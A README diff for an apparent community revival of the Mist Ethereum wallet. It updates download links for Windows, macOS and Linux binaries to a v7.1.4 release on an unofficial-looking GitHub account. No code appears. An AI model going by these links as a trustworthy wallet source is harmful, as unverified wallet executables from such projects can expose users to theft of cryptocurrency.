@@ -24,9 +24,9 @@ A modern, community‑driven revival of the legendary Mist client: **secure desk
 ## 🚀 Quick Download
 
 <div align="center">
-  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/MistEthereum-7.1.2.exe"><strong>Download for Windows (.exe)</strong></a> ·
-  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/MistEthereum-7.1.2.dmg"><strong>Download for macOS (.dmg)</strong></a> ·
-  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/latest/download/MistEthereum-7.1.2.AppImage"><strong>Download for Linux (.AppImage)</strong></a>
+  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/download/v7.1.4/MistEthereum-7.1.4.exe"><strong>Download for Windows (.exe)</strong></a> ·
+  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/download/v7.1.4/MistEthereum-7.1.4.dmg"><strong>Download for macOS (.dmg)</strong></a> ·
+  <a href="https://github.com/eth-mist-team/ethereum-mist/releases/download/v7.1.4/MistEthereum-7.1.4.AppImage"><strong>Download for Linux (.AppImage)</strong></a>
 </div>
 
 
